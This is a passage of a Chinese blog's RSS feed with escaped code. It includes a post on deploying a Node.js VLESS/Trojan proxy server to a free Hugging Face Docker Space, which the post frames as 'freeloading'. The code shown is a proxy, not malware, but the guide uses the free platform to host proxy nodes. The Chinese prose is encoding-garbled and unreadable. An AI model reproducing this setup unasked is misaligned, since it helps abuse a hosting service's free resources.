&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;msg.length &amp;gt; &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; msg&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; 0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      const &lt;span class=&#34;nv&#34;&gt;id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1, 17&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      const &lt;span class=&#34;nv&#34;&gt;isVless&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; id.every&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;v, i&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;nv&#34;&gt;v&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; parseInt&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;uuid.substr&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i * 2, 2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, 16&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;isVless&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!handleVlessConnection&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ws, msg&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          ws.close&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!handleTrojanConnection&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ws, msg&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      ws.close&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;httpServer.listen&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PORT, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  const &lt;span class=&#34;nv&#34;&gt;scheme&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; tlsOptions ? &lt;span class=&#34;s1&#34;&gt;&amp;#39;HTTPS/WSS&amp;#39;&lt;/span&gt; : &lt;span class=&#34;s1&#34;&gt;&amp;#39;HTTP/WS&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  console.log&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;Server is running on &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;scheme&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt; port &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;PORT&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åŸå§‹æ–‡ä»¶é•¿è¿™æ ·ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>huggingface.coè–…ç¾Šæ¯›è®°</title>
      <link>https://rendoumi.com/posts/20260106-huggingface_vless_trojan/</link>
      <pubDate>Tue, 06 Jan 2026 09:00:01 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20260106-huggingface_vless_trojan/</guid>
      <description>&lt;p&gt;åº”ä½¬å‹çš„è¦æ±‚å†å‡ºä¸€ç¯‡æ–‡ç« ï¼Œå‰é¢è–…äº†wispbyte.comçš„ç¾Šæ¯›ï¼Œä½†æ˜¯å§å®¹å™¨æ¯”è¾ƒå¼±å°ï¼Œå¼ºä¸€ç‚¹çš„å°±æ˜¯huggingface.coçš„å®¹å™¨ï¼š&lt;/p&gt;
&lt;p&gt;Freeç‰ˆæœ¬å°±æ˜¯2vCPUå’Œ16GB RAMï¼Œå°±å·²ç»éå¸¸å¼ºäº†&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260106092514521&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260106-huggingface_vless_trojan/image-20260106092514521.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;é‚£å…ˆä»‹ç»ä¸€ä¸‹huggingfaceï¼Œå…¶å®è¿™æ˜¯ä¸€å®¶éå¸¸å¼ºæ‚çš„å…¬å¸ï¼Œå¯ä»¥ç§°ä½œæ˜¯â€œAIç•Œçš„GitHubâ€ï¼Œå¯ä»¥åˆ†äº«æ¨¡å‹ï¼Œæ•°æ®é›†ï¼Œç„¶åæ¼”ç¤ºåº”ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ç”¨åˆ°çš„å°±æ˜¯è¿™ä¸ªæ¼”ç¤ºåº”ç”¨ï¼ˆSpacesï¼‰&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæ³¨å†Œå¥½è´¦å·ï¼Œç„¶åå³ä¸Šè§’ç‚¹å‡»å¤´åƒæŒ‰é’®ï¼Œæ–°å»ºä¸€ä¸ªSpace&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260106104401915&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260106-huggingface_vless_trojan/image-20260106104401915.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åå¡«å…¥å¿…é¡»é¡¹&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Space nameï¼šå°±å†™myhome&lt;/li&gt;
&lt;li&gt;Short descriptionï¼šSave Our Home&lt;/li&gt;
&lt;li&gt;Licenseï¼šMIT&lt;/li&gt;
&lt;li&gt;SDKï¼šé€‰æ‹©Docker&lt;/li&gt;
&lt;li&gt;Docker template: é€‰æ‹©Blank&lt;/li&gt;
&lt;li&gt;Space hardwareï¼šé€‰æ‹©Free&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260106104916165&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260106-huggingface_vless_trojan/image-20260106104916165.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å…¶å®ƒéƒ½ä¸é€‰ï¼Œæœ€åCreateSpaceå³å¯&lt;/p&gt;
&lt;p&gt;ç„¶åå°±å»ºå¥½äº†ï¼Œå…¶å®æ˜¯ç»™ä½ å¼€äº†ä¸€ä¸ªgitçš„repo&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬åˆ°å³ä¸Šè§’ï¼Œé€‰æ‹©Filesé€‰é¡¹&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260106105206257&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260106-huggingface_vless_trojan/image-20260106105206257.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åæ‰“å¼€çš„æ–‡ä»¶é¡µé¢ï¼Œåªæœ‰ä¸¤ä¸ªæ–‡ä»¶&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260106105253425&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260106-huggingface_vless_trojan/image-20260106105253425.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è€å¥—è·¯ï¼Œå»ºç«‹ä¸€ä¸ªDockerfileæ–‡ä»¶ï¼Œå°±æ˜¯å®¹å™¨çš„æ‰“åŒ…æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260106105349755&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260106-huggingface_vless_trojan/image-20260106105349755.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Dockerfileçš„å†…å®¹ï¼Œç¼–è¾‘å¥½ï¼Œç„¶åæäº¤ï¼Œæ³¨æ„ï¼šLinuxæœ‰ä¸¥æ ¼çš„å¤§å°å†™è¦æ±‚ï¼ŒåŠ¡å¿…éµå®ˆ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;FROM nikolaik/python-nodejs:python3.14-nodejs22
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;WORKDIR /tmp
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;COPY index.js /tmp/index.js
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;COPY package.json /tmp/package.json
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;COPY index.html /tmp/index.html
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CMD npm install &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; node index.js
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;image-20260106114337260&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260106-huggingface_vless_trojan/image-20260106114337260.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åæˆ‘ä»¬æŠŠindex.jså‡†å¤‡å¥½ï¼Œéœ€è¦ä¿®æ”¹å‡ ä¸ªåœ°æ–¹&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;http&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; require&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;http&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;https&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; require&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;https&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;fs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; require&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fs&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;axios&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; require&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;axios&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;net&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; require&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;net&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; require&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;path&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;crypto&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; require&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;crypto&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; Buffer &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; require&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;buffer&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; WebSocket, createWebSocketStream &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; require&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ws&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;// ç”Ÿæˆ UUID v4
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; generateUUID&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; crypto.randomUUID&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;UUID&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; process.env.UUID &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; generateUUID&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;DOMAIN&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; process.env.DOMAIN &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;1234.abc.com&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;       // å¡«å†™é¡¹ç›®åŸŸå
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;WSPATH&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; process.env.WSPATH &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; UUID.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0, 8&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;     // èŠ‚ç‚¹è·¯å¾„ï¼Œé»˜è®¤è·å–uuidå‰8ä½
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;SUB_PATH&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; process.env.SUB_PATH &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;sub&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;            // è·å–èŠ‚ç‚¹çš„è®¢é˜…è·¯å¾„
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;NAME&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; process.env.NAME &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;                       // èŠ‚ç‚¹åç§°
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;PORT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; process.env.PORT &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; 7860&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;                     // httpå’ŒwsæœåŠ¡ç«¯å£
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;TLS_KEY_PATH&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; process.env.TLS_KEY_PATH &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;tls.key&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;TLS_CERT_PATH&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; process.env.TLS_CERT_PATH &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;tls.crt&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ISP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;GetISP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; async &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  try &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; await axios.get&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;https://api.ip.sb/geoip&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; res.data&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;ISP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.country_code&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;-&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.isp&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;.replace&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;/ /g, &lt;span class=&#34;s1&#34;&gt;&amp;#39;_&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; catch &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;e&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
